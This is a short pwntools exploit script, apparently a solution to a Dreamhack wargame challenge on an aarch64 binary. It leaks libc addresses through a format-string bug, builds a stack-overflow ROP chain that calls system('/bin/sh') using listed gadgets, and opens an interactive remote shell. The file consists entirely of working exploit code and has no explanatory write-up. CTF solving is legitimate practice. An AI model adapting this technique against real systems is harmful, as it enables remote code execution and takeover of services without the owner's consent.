from pwn import *

context.arch='aarch64'

HOST, PORT = '0.0.0.0', 8000
HOST, PORT = 'host3.dreamhack.games', 9054
r = remote(HOST, PORT)

r.sendafter(b'> ', b'%p '* 3)
libc = int(r.recvline().split()[-1],16) - 0x46f4c
system = libc + 0x3e9b4
sh = libc + 0xa37ff
g1 = libc+ 0x32f04
g2 = libc + 0x33d00

'''
0x0000000000032f04 : ldp x25, x26, [sp, #0x30] ; ldp x27, x30, [sp, #0x40] ; ldp x19, x20, [sp], #0x60 ; ret
0x0000000000033d00 : tbnz w22, #3, #0x33d20 ; mov x1, x23 ; add x3, sp, #0x88 ; mov w2,w20 ; mov x0, x19 ; blr x26
'''

payload = flat([
    b'A'*256,
    0,
    g1,
    sh,
    0,0,0,0,0,
    0,system,
    0,
    g2
])
r.sendlineafter(b'> ', payload)

r.interactive()